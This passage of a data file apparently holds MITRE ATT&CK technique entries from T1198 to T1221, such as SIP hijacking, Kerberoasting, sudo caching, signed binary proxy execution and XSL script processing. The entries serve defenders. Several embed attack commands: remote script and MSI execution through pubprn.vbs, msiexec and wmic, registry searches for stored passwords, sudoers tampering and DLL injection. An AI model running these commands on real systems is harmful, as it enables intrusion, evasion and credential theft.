                          'verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, '
                          'Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog '
                          'Files and Signatures April 2017)) and are identified by globally unique identifiers '
                          '(GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n'
                          '\n'
                          'Similar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse '
                          'this architecture to subvert trust controls and bypass security policies that allow only '
                          'legitimately signed code to execute on a system. Adversaries may hijack SIP and trust '
                          'provider components to mislead operating system and whitelisting tools to classify '
                          'malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n'
                          '\n'
                          '* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in '
                          '<code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType '
                          '0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library '
                          '(DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded '
                          'digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an '
                          'exported function that always returns a known good signature value (ex: a Microsoft '
                          'signature for Portable Executables) rather than the file’s real signature, an adversary can '
                          'apply an acceptable signature value all files using that SIP (Citation: GitHub SIP POC Sept '
                          '2017) (although a hash mismatch will likely occur, invalidating the signature, since the '
                          'hash returned by the function will not match the value computed from the file).\n'
                          '* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in '
                          '<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType '
                          '0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP’s '
                          'CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the '
                          'signed hash value. By pointing to a maliciously-crafted DLL with an exported function that '
                          'always returns TRUE (indicating that the validation was successful), an adversary can '
                          'successfully validate any file (with a legitimate signature) using that SIP (Citation: '
                          'GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned '
                          'CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a '
                          'suitable exported function from an already present DLL, avoiding the requirement to drop '
                          'and execute a new file on disk.\n'
                          '* Modifying the <code>DLL</code> and <code>Function</code> Registry values in '
                          '<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust '
                          'provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy '
                          'function, which is where the decoded and parsed signature is checked and the majority of '
                          'trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData '
                          'function, this value can be redirected to a suitable exported function from an already '
                          'present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is '
                          'complex).\n'
                          '* **Note:** The above hijacks are also possible without modifying the Registry via [DLL '
                          'Search Order Hijacking](https://attack.mitre.org/techniques/T1038).\n'
                          '\n'
                          'Hijacking SIP or trust provider components can also enable persistent code execution, since '
                          'these malicious components may be invoked by any application that performs code signing or '
                          'signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)',
           'name': 'SIP and Trust Provider Hijacking',
           'platforms': ['Windows']},
 'T1199': {'attack_id': 'T1199',
           'categories': ['initial-access'],
           'description': 'Adversaries may breach or otherwise leverage organizations who have access to intended '
                          'victims. Access through trusted third party relationship exploits an existing connection '
                          'that may not be protected or receives less scrutiny than standard mechanisms of gaining '
                          'access to a network.\n'
                          '\n'
                          'Organizations often grant elevated access to second or third-party external providers in '
                          'order to allow them to manage internal systems. Some examples of these relationships '
                          'include IT services contractors, managed security providers, infrastructure contractors '
                          "(e.g. HVAC, elevators, physical security). The third-party provider's access may be "
                          'intended to be limited to the infrastructure being maintained, but may exist on the same '
                          'network as the rest of the enterprise. As such, [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to '
                          'internal network systems may be compromised and used.',
           'name': 'Trusted Relationship',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1200': {'attack_id': 'T1200',
           'categories': ['initial-access'],
           'description': 'Computer accessories, computers, or networking hardware may be introduced into a system as '
                          'a vector to gain execution. While public references of usage by APT groups are scarce, many '
                          'penetration testers leverage hardware additions for initial access. Commercial and open '
                          'source products are leveraged with capabilities such as passive network tapping (Citation: '
                          'Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov '
                          '2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via '
                          'DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network '
                          '(Citation: McMillan Pwn March 2012), and others.',
           'name': 'Hardware Additions',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1201': {'attack_id': 'T1201',
           'categories': ['discovery'],
           'description': 'Password policies for networks are a way to enforce complex passwords that are difficult to '
                          'guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). An '
                          'adversary may attempt to access detailed information about the password policy used within '
                          'an enterprise network. This would help the adversary to create a list of common passwords '
                          'and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the '
                          "minimum password length should be 8, then not trying passwords such as 'pass123'; not "
                          'checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock '
                          'out accounts).\n'
                          '\n'
                          'Password policies can be set and discovered on Windows, Linux, and macOS systems. '
                          '(Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)\n'
                          '\n'
                          '### Windows\n'
                          '* <code>net accounts</code>\n'
                          '* <code>net accounts /domain</code>\n'
                          '\n'
                          '### Linux\n'
                          '* <code>chage -l <username></code>\n'
                          '* <code>cat /etc/pam.d/common-password</code>\n'
                          '\n'
                          '### macOS\n'
                          '* <code>pwpolicy getaccountpolicies</code>',
           'name': 'Password Policy Discovery',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1202': {'attack_id': 'T1202',
           'categories': ['defense-evasion'],
           'description': 'Various Windows utilities may be used to execute commands, possibly without invoking '
                          '[cmd](https://attack.mitre.org/software/S0106). For example, '
                          '[Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant '
                          '(pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other '
                          'utilities may invoke the execution of programs and commands from a [Command-Line '
                          'Interface](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. '
                          '(Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n'
                          '\n'
                          'Adversaries may abuse these features for [Defense '
                          'Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary '
                          'execution while subverting detections and/or mitigation controls (such as Group Policy) '
                          'that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file '
                          'extensions more commonly associated with malicious payloads.',
           'name': 'Indirect Command Execution',
           'platforms': ['Windows']},
 'T1203': {'attack_id': 'T1203',
           'categories': ['execution'],
           'description': 'Vulnerabilities can exist in software due to unsecure coding practices that can lead to '
                          'unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through '
                          'targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most '
                          'valuable exploits to an offensive toolkit are those that can be used to obtain code '
                          'execution on a remote system because they can be used to gain access to that system. Users '
                          'will expect to see files related to the applications they commonly used to do work, so they '
                          'are a useful target for exploit research and development because of their high utility.\n'
                          '\n'
                          'Several types exist:\n'
                          '\n'
                          '### Browser-based Exploitation\n'
                          '\n'
                          'Web browsers are a common target through [Drive-by '
                          'Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing '
                          'Link](https://attack.mitre.org/techniques/T1192). Endpoint systems may be compromised '
                          'through normal web browsing or from certain users being targeted by links in spearphishing '
                          'emails to adversary controlled sites used to exploit the web browser. These often do not '
                          'require an action by the user for the exploit to be executed.\n'
                          '\n'
                          '### Office Applications\n'
                          '\n'
                          'Common office and productivity applications such as Microsoft Office are also targeted '
                          'through [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193), '
                          '[Spearphishing Link](https://attack.mitre.org/techniques/T1192), and [Spearphishing via '
                          'Service](https://attack.mitre.org/techniques/T1194). Malicious files will be transmitted '
                          'directly as attachments or through links to download them. These require the user to open '
                          'the document or file for the exploit to run.\n'
                          '\n'
                          '### Common Third-party Applications\n'
                          '\n'
                          'Other applications that are commonly seen or are part of the software deployed in a target '
                          'network may also be used for exploitation. Applications such as Adobe Reader and Flash, '
                          'which are common in enterprise environments, have been routinely targeted by adversaries '
                          'attempting to gain access to systems. Depending on the software and nature of the '
                          'vulnerability, some may be exploited in the browser or require the user to open a file. For '
                          'instance, some Flash exploits have been delivered as objects within Microsoft Office '
                          'documents.',
           'name': 'Exploitation for Client Execution',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1204': {'attack_id': 'T1204',
           'categories': ['execution'],
           'description': 'An adversary may rely upon specific actions by a user in order to gain execution. This may '
                          'be direct code execution, such as when a user opens a malicious executable delivered via '
                          '[Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and '
                          'apparent extension of a document file. It also may lead to other execution techniques, such '
                          'as when a user clicks on a link delivered via [Spearphishing '
                          'Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or '
                          'application vulnerability via [Exploitation for Client '
                          'Execution](https://attack.mitre.org/techniques/T1203). While User Execution frequently '
                          'occurs shortly after Initial Access it may occur at other phases of an intrusion, such as '
                          "when an adversary places a file in a shared directory or on a user's desktop hoping that a "
                          'user will click on it.',
           'name': 'User Execution',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1205': {'attack_id': 'T1205',
           'categories': ['defense-evasion', 'persistence', 'command-and-control'],
           'description': 'Port Knocking is a well-established method used by both defenders and adversaries to hide '
                          'open ports from access. To enable a port, an adversary sends a series of packets with '
                          'certain characteristics before the port will be opened. Usually this series of packets '
                          'consists of attempted connections to a predefined sequence of closed ports, but can involve '
                          'unusual flags, specific strings or other unique characteristics. After the sequence is '
                          'completed, opening a port is often accomplished by the host based firewall, but could also '
                          'be implemented by custom software. \n'
                          '\n'
                          'This technique has been observed to both for the dynamic opening of a listening port as '
                          'well as the initiating of a connection to a listening server on a different system.\n'
                          '\n'
                          'The observation of the signal packets to trigger the communication can be conducted through '
                          'different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r '
                          '2002), is to use the libpcap libraries to sniff for the packets in question. Another method '
                          'leverages raw sockets, which enables the malware to use ports that are already open for use '
                          'by other programs.',
           'name': 'Port Knocking',
           'platforms': ['Linux', 'macOS']},
 'T1206': {'attack_id': 'T1206',
           'categories': ['privilege-escalation'],
           'description': 'The <code>sudo</code> command "allows a system administrator to delegate authority to give '
                          'certain users (or groups of users) the ability to run some (or all) commands as root or '
                          'another user while providing an audit trail of the commands and their arguments." '
                          '(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has '
                          'some useful configuration features such as a <code>timestamp_timeout</code> that is the '
                          'amount of time in minutes between instances of <code>sudo</code> before it will re-prompt '
                          'for a password. This is because <code>sudo</code> has the ability to cache credentials for '
                          'a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a '
                          'timestamp of when sudo was last run to determine this timeout. Additionally, there is a '
                          '<code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. '
                          'This means that, for example, the sudo timeout of one tty will not affect another tty (you '
                          'will have to type the password again).\n'
                          '\n'
                          'Adversaries can abuse poor configurations of this to escalate privileges without needing '
                          "the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored to see if it "
                          'falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute '
                          "sudo commands without needing to supply the user's password. When <code>tty_tickets</code> "
                          'is disabled, adversaries can do this from any tty for that user. \n'
                          '\n'
                          'The OSX Proton Malware has disabled <code>tty_tickets</code> to potentially make scripting '
                          "easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation: "
                          'cybereason osx proton). In order for this change to be reflected, the Proton malware also '
                          'must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has '
                          '<code>tty_tickets</code> enabled by default.',
           'name': 'Sudo Caching',
           'platforms': ['Linux', 'macOS']},
 'T1207': {'attack_id': 'T1207',
           'categories': ['defense-evasion'],
           'description': 'DCShadow is a method of manipulating Active Directory (AD) data, including objects and '
                          'schemas, by registering (or reusing an inactive registration) and simulating the behavior '
                          'of a Domain Controller (DC). (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan '
                          '2018) Once registered, a rogue DC may be able to inject and replicate changes into AD '
                          'infrastructure for any domain object, including credentials and keys.\n'
                          '\n'
                          'Registering a rogue DC involves creating a new server and nTDSDSA objects in the '
                          'Configuration partition of the AD schema, which requires Administrator privileges (either '
                          'Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n'
                          '\n'
                          'This technique may bypass system logging and security monitors such as security information '
                          'and event management (SIEM) products (since actions taken on a rogue DC may not be reported '
                          'to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and '
                          'delete replication and other associated metadata to obstruct forensic analysis. Adversaries '
                          'may also utilize this technique to perform [SID-History '
                          'Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as '
                          'accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: '
                          'DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018)',
           'name': 'DCShadow',
           'platforms': ['Windows']},
 'T1208': {'attack_id': 'T1208',
           'categories': ['credential-access'],
           'description': 'Service principal names (SPNs) are used to uniquely identify each instance of a Windows '
                          'service. To enable authentication, Kerberos requires that SPNs be associated with at least '
                          'one service logon account (an account specifically tasked with running a service (Citation: '
                          'Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: '
                          'Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y '
                          'Kerberoast Nov 2016)\n'
                          '\n'
                          'Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or '
                          'more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain '
                          'controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity '
                          'Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 '
                          'algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated '
                          'with the SPN is used as the private key and is thus vulnerable to offline [Brute '
                          'Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext '
                          'credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire '
                          'InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n'
                          '\n'
                          'This same attack could be executed using service tickets captured from network traffic. '
                          '(Citation: AdSecurity Cracking Kerberos Dec 2015)\n'
                          '\n'
                          'Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via '
                          'access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS '
                          'Attacking Kerberos Nov 2014)',
           'name': 'Kerberoasting',
           'platforms': ['Windows']},
 'T1209': {'attack_id': 'T1209',
           'categories': ['persistence'],
           'description': 'The Windows Time service (W32Time) enables time synchronization across and within domains. '
                          '(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for '
                          'retrieving time stamps from hardware/network resources and outputting these values to other '
                          'network clients. (Citation: Microsoft TimeProvider)\n'
                          '\n'
                          'Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the '
                          'subkeys of  '
                          '<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>. '
                          '(Citation: Microsoft TimeProvider) The time provider manager, directed by the service '
                          'control manager, loads and starts time providers listed and enabled under this key at '
                          'system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)\n'
                          '\n'
                          'Adversaries may abuse this architecture to establish Persistence, specifically by '
                          'registering and enabling a malicious DLL as a time provider. Administrator privileges are '
                          'required for time provider registration, though execution will run in context of the Local '
                          'Service account. (Citation: Github W32Time Oct 2017)',
           'name': 'Time Providers',
           'platforms': ['Windows']},
 'T1210': {'attack_id': 'T1210',
           'categories': ['lateral-movement'],
           'description': 'Exploitation of a software vulnerability occurs when an adversary takes advantage of a '
                          'programming error in a program, service, or within the operating system software or kernel '
                          'itself to execute adversary-controlled code.\xa0A common goal for post-compromise '
                          'exploitation of remote services is for lateral movement to enable access to a remote '
                          'system.\n'
                          '\n'
                          'An adversary may need to determine if the remote system is in a vulnerable state, which may '
                          'be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1046) or '
                          'other Discovery methods looking for common, vulnerable software that may be deployed in the '
                          'network, the lack of certain patches that may indicate vulnerabilities,  or security '
                          'software that may be used to detect or contain remote exploitation. Servers are likely a '
                          'high value target for lateral movement exploitation, but endpoint systems may also be at '
                          'risk if they provide an advantage or access to additional resources.\n'
                          '\n'
                          'There are several well-known vulnerabilities that exist in common services such as SMB '
                          '(Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well '
                          'as applications that may be used within internal networks such as MySQL (Citation: NVD '
                          'CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\n'
                          '\n'
                          'Depending on the permissions level of the vulnerable remote service an adversary may '
                          'achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) '
                          'as a result of lateral movement exploitation as well.',
           'name': 'Exploitation of Remote Services',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1211': {'attack_id': 'T1211',
           'categories': ['defense-evasion'],
           'description': 'Exploitation of a software vulnerability occurs when an adversary takes advantage of a '
                          'programming error in a program, service, or within the operating system software or kernel '
                          'itself to execute adversary-controlled code.\xa0Vulnerabilities may exist in defensive '
                          'security software that can be used to disable or circumvent them.\n'
                          '\n'
                          'Adversaries may have prior knowledge through reconnaissance that security software exists '
                          'within an environment or they may perform checks during or shortly after the system is '
                          'compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1063). '
                          'The security software will likely be targeted directly for exploitation. There are examples '
                          'of antivirus software being targeted by persistent threat groups to avoid detection.',
           'name': 'Exploitation for Defense Evasion',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1212': {'attack_id': 'T1212',
           'categories': ['credential-access'],
           'description': 'Exploitation of a software vulnerability occurs when an adversary takes advantage of a '
                          'programming error in a program, service, or within the operating system software or kernel '
                          'itself to execute adversary-controlled code.\xa0Credentialing and authentication mechanisms '
                          'may be targeted for exploitation by adversaries as a means to gain access to useful '
                          'credentials or circumvent the process to gain access to systems. One example of this is '
                          'MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain '
                          'user permissions. (Citation: Technet MS14-068) (Citation: ADSecurity Detecting Forged '
                          'Tickets) Exploitation for credential access may also result in Privilege Escalation '
                          'depending on the process targeted or credentials obtained.',
           'name': 'Exploitation for Credential Access',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1213': {'attack_id': 'T1213',
           'categories': ['collection'],
           'description': 'Adversaries may leverage information repositories to mine valuable information. Information '
                          'repositories are tools that allow for storage of information, typically to facilitate '
                          'collaboration or information sharing between users, and can store a wide variety of data '
                          'that may aid adversaries in further objectives, or direct access to the target '
                          'information.\n'
                          '\n'
                          'The following is a brief list of example information that may hold potential value to an '
                          'adversary and may also be found on an information repository:\n'
                          '\n'
                          '* Policies, procedures, and standards\n'
                          '* Physical / logical network diagrams\n'
                          '* System architecture diagrams\n'
                          '* Technical system documentation\n'
                          '* Testing / development credentials\n'
                          '* Work / project schedules\n'
                          '* Source code snippets\n'
                          '* Links to network shares and other internal resources\n'
                          '\n'
                          'Specific common information repositories include:\n'
                          '\n'
                          '### Microsoft SharePoint\n'
                          'Found in many enterprise networks and often used to store and share significant amounts of '
                          'documentation.\n'
                          '\n'
                          '### Atlassian Confluence\n'
                          'Often found in development environments alongside Atlassian JIRA, Confluence is generally '
                          'used to store development-related documentation.',
           'name': 'Data from Information Repositories',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1214': {'attack_id': 'T1214',
           'categories': ['credential-access'],
           'description': 'The Windows Registry stores configuration information that can be used by the system or '
                          'other programs. Adversaries may query the Registry looking for credentials and passwords '
                          'that have been stored for use by other programs or services. Sometimes these credentials '
                          'are used for automatic logons.\n'
                          '\n'
                          'Example commands to find Registry keys related to password information: (Citation: '
                          'Pentestlab Stored Credentials)\n'
                          '\n'
                          '* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n'
                          '* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>',
           'name': 'Credentials in Registry',
           'platforms': ['Windows']},
 'T1215': {'attack_id': 'T1215',
           'categories': ['persistence'],
           'description': 'Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into '
                          'the kernel upon demand. They extend the functionality of the kernel without the need to '
                          'reboot the system. For example, one type of module is the device driver, which allows the '
                          'kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\xa0'
                          'When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode '
                          '[Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating '
                          'system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\xa0Adversaries '
                          'can use loadable kernel modules to covertly persist on a system and evade defenses. '
                          'Examples have been found in the wild and there are some open source projects. (Citation: '
                          'Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) '
                          '(Citation: GitHub Diamorphine)\n'
                          '\n'
                          'Common features of LKM based rootkits include: hiding itself, selective hiding of files, '
                          'processes and network activity, as well as log tampering, providing authenticated backdoors '
                          'and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n'
                          '\n'
                          'Kernel extensions, also called kext, are used for macOS to load functionality onto a system '
                          'similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and '
                          '<code>kextunload</code> commands. Several examples have been found where this can be used. '
                          '(Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel '
                          'Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)',
           'name': 'Kernel Modules and Extensions',
           'platforms': ['Linux', 'macOS']},
 'T1216': {'attack_id': 'T1216',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Scripts signed with trusted certificates can be used to proxy execution of malicious files. '
                          'This behavior may bypass signature validation restrictions and application whitelisting '
                          'solutions that do not account for use of these scripts.\n'
                          '\n'
                          'PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. '
                          '(Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript '
                          'C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 '
                          'script:http[:]//192.168.1.100/hi.png</code>\n'
                          '\n'
                          'There are several other signed scripts that may be used in a similar manner. (Citation: '
                          'GitHub Ultimate AppLocker Bypass List)',
           'name': 'Signed Script Proxy Execution',
           'platforms': ['Windows']},
 'T1217': {'attack_id': 'T1217',
           'categories': ['discovery'],
           'description': 'Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser '
                          'bookmarks may reveal personal information about users (ex: banking sites, interests, social '
                          'media, etc.) as well as details about internal network resources such as servers, '
                          'tools/dashboards, or other related infrastructure.\n'
                          '\n'
                          'Browser bookmarks may also highlight additional targets after an adversary has access to '
                          'valid credentials, especially [Credentials in '
                          'Files](https://attack.mitre.org/techniques/T1081) associated with logins cached by a '
                          'browser.\n'
                          '\n'
                          'Specific storage locations vary based on platform and/or application, but browser bookmarks '
                          'are typically stored in local files/databases.',
           'name': 'Browser Bookmark Discovery',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1218': {'attack_id': 'T1218',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Binaries signed with trusted digital certificates can execute on Windows systems protected '
                          'by digital signature validation. Several Microsoft signed binaries that are default on '
                          'Windows installations can be used to proxy execution of other files. This behavior may be '
                          'abused by adversaries to execute malicious files that could bypass application whitelisting '
                          'and signature validation on systems. This technique accounts for proxy execution methods '
                          'that are not already accounted for within the existing techniques.\n'
                          '\n'
                          '### Msiexec.exe\n'
                          'Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may '
                          'use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it '
                          'to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor '
                          'Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to '
                          'execute DLLs.(Citation: LOLBAS Msiexec)\n'
                          '\n'
                          '* <code>msiexec.exe /q /i "C:\\path\\to\\file.msi"</code>\n'
                          '* <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>\n'
                          '* <code>msiexec.exe /y "C:\\path\\to\\file.dll"</code>\n'
                          '\n'
                          '### Mavinject.exe\n'
                          'Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to '
                          'input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)\n'
                          '\n'
                          '* <code>"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe" '
                          '&lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>\n'
                          '* <code>C:\\Windows\\system32\\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH '
                          'DLL&gt;</code>\n'
                          '\n'
                          '### SyncAppvPublishingServer.exe\n'
                          'SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing '
                          'powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)\n'
                          '\n'
                          '### Odbcconf.exe\n'
                          'Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity '
                          '(ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be '
                          'misused to execute functionality equivalent to '
                          '[Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a '
                          'DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: '
                          'TrendMicro Cobalt Group Nov 2017)\n'
                          '\n'
                          '* <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\\Users\\Public\\file.dll"&rbrace;</code>\n'
                          '\n'
                          'Several other binaries exist that may be used to perform similar behavior. (Citation: '
                          'GitHub Ultimate AppLocker Bypass List)',
           'name': 'Signed Binary Proxy Execution',
           'platforms': ['Windows']},
 'T1219': {'attack_id': 'T1219',
           'categories': ['command-and-control'],
           'description': 'An adversary may use legitimate desktop support and remote access software, such as Team '
                          'Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and '
                          'control channel to target systems within networks. These services are commonly used as '
                          'legitimate technical support software, and may be whitelisted within a target environment. '
                          'Remote access tools like VNC, Ammy, and Teamviewer are used frequently when compared with '
                          'other legitimate software commonly used by adversaries. (Citation: Symantec Living off the '
                          'Land)\n'
                          '\n'
                          'Remote access tools may be established and used post-compromise as alternate communications '
                          'channel for [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a way to '
                          'establish an interactive remote desktop session with the target system. They may also be '
                          'used as a component of malware to establish a reverse connection or back-connect to a '
                          'service or adversary controlled system.\n'
                          '\n'
                          'Admin tools such as TeamViewer have been used by several groups targeting institutions in '
                          'countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike '
                          '2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)',
           'name': 'Remote Access Tools',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1220': {'attack_id': 'T1220',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and '
                          'rendering of data within XML files. To support complex operations, the XSL standard '
                          'includes support for embedded scripting in various languages. (Citation: Microsoft XSLT '
                          'Script Mar 2017)\n'
                          '\n'
                          'Adversaries may abuse this functionality to execute arbitrary files while potentially '
                          'bypassing application whitelisting defenses. Similar to [Trusted Developer '
                          'Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line '
                          'transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed '
                          'and used to execute malicious JavaScript embedded within local or remote (URL referenced) '
                          'XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not '
                          'installed by default, an adversary will likely need to package it with dropped files. '
                          '(Citation: Reaqta MSXSL Spearphishing MAR 2018)\n'
                          '\n'
                          'Command-line example: (Citation: Penetration Testing Lab MSXSL July 2017)\n'
                          '\n'
                          '* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n'
                          '\n'
                          'Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows '
                          'Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or '
                          'VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also '
                          'execute local/remote scripts and, similar to its '
                          '[Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages '
                          'a trusted, built-in Windows tool.\n'
                          '\n'
                          'Command-line examples: (Citation: subTee WMIC XSL APR 2018)\n'
                          '\n'
                          '* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n'
                          '* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>',
           'name': 'XSL Script Processing',
           'platforms': ['Windows']},
 'T1221': {'attack_id': 'T1221',
           'categories': ['defense-evasion'],
           'description': 'Microsoft’s Open Office XML (OOXML) specification defines an XML-based format for Office '
                          'documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML '
                          'files are packed together ZIP archives compromised of various XML files, referred to as '
                          'parts, containing properties that collectively define how a document is rendered. '
                          '(Citation: Microsoft Open XML July 2017)\n'
                          '\n'
                          'Properties within parts may reference shared public resources accessed via online URLs. For '
                          'example, template properties reference a file, serving as a pre-formatted document '
                          'blueprint, that is fetched when the document is loaded.\n'
                          '\n'
